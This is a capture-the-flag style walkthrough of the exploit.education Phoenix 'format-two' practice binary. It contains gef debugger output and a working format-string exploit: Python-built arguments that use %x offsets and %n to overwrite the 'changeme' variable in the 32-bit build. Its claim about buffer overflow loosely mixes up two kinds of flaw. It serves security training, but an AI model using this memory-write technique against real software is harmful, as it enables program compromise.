

First we find the location of changeme and buf
```sh
gef➤  print &changeme
$2 = (<data variable, no debug info> *) 0x600af0 <changeme>
gef➤  print $rbp - 0x100
$3 = (void *) 0x7fffffffe410
```

We need to write \xf0\x0a\x60\x00 into the buffer so that we can write to that address using %n. However, strcopy will stop copying when it reads the \x00, thinking it's the end of a string. This binary is therefore not vulnerable to a buffer overflow.

The 32-bit version (i486) however:
```sh
gef➤  print &changeme
$1 = (<data variable, no debug info> *) 0x8049868 <cha
```

```sh
user@phoenix-amd64:/opt/phoenix/i486$ exploit=$(python -c 'print("\x68\x98\x04\x08" + "AAAABBBB" + " %x "*14)')
user@phoenix-amd64:/opt/phoenix/i486$ ./format-two "$exploit"
Welcome to phoenix/format-two, brought to you by https://exploit.education
hAAAABBBB ffffd7ba  100  0  f7f84b67  ffffd5f0  ffffd5d8  80485a0  ffffd4d0  ffffd7ba  100  3e8  8049868  41414141  42424242 Better luck next time!
```


We see our A's and B's at argument number 13 and 14, and the address of changeme is at argument number 12. Therefore:

```sh
user@phoenix-amd64:/opt/phoenix/i486$ exploit=$(python -c 'print("\x68\x98\x04\x08" + "AAAABBBB" + " %x "*11 + "%n")')
user@phoenix-amd64:/opt/phoenix/i486$ ./format-two "$exploit"
Welcome to phoenix/format-two, brought to you by https://exploit.education
hAAAABBBB ffffd7c4  100  0  f7f84b67  ffffd600  ffffd5e8  80485a0  ffffd4e0  ffffd7c4  100  3e8 Well done, the 'changeme' variable has been changed correctly!
```